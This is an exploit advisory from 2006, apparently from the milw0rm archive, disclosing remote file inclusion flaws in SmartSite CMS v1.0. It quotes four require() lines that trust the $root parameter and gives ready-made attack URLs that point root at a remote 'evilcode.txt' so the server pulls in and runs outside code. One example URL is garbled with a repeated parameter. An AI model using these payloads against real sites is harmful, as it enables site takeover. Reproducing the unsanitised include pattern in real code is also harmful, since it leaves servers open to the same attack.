@@ -1,0 +1,44 @@
+smartsite cms  v1.0 Multiple Remote File include
+-------------------------------------------------
+Discovered By CrAsh_oVeR_rIdE
+Arabian Security Team
+-------------------------------------------------
+site of script:www.smartsitecms.net
+-------------------------------------------------
+Vulnerable: smartsite cms  v1.0
+-------------------------------------------------
+vulnerable code:
+----------------------
+1-in comment.php :
+require($root . "include/inc_foot.php");
+---------------------------------------
+2-in /admin/test.php :
+require($root . "include/inc_adminfooter.php");
+---------------------------------------
+3-in /admin/index.php :
+require($root . "admin/include/inc_adminfooter.php");
+---------------------------------------
+4-in /admin/include/inc_adminfoot.php:
+require($root . "include/inc_footer.php");
+---------------------------------------
+$root parameter File include
+-----------------------------------------------------------------------------------------------------------------------------------------
+vulnerable files  :
+--------------------
+comment.php
+/admin/test.php
+/admin/index.php
+/admin/include/inc_adminfoot.php
+-------------------------------------------------
+example:
+www.example.com/(path)/admin/test.php?root=http://evilcode.txt?
+www.example.com/(path)/comment.php?root=http://evilcode.txt?
+www.example.com/(path)/admin/index.php?root=http://evilcode.txt??root=http://evilcode.txt?
+www.example.com/(path)/admin/include/inc_adminfoot.php?root=http://evilcode.txt?
+-------------------------------------------------
+Discovered By CrAsh_oVeR_rIdE
+E-mail:KARKOR23@hotmail.com
+Site:www.lezr.com
+Greetz:KING-HACKER,YOUNG HACKER,SIMO64,ROOT-HACKED,SAUDI,QPTAN,POWERWALL,SNIPER_SA,Black-Code,ALMOKAN3, mr-hcr AND ALL LEZR.COM Member
+
+# milw0rm.com [2006-07-01]
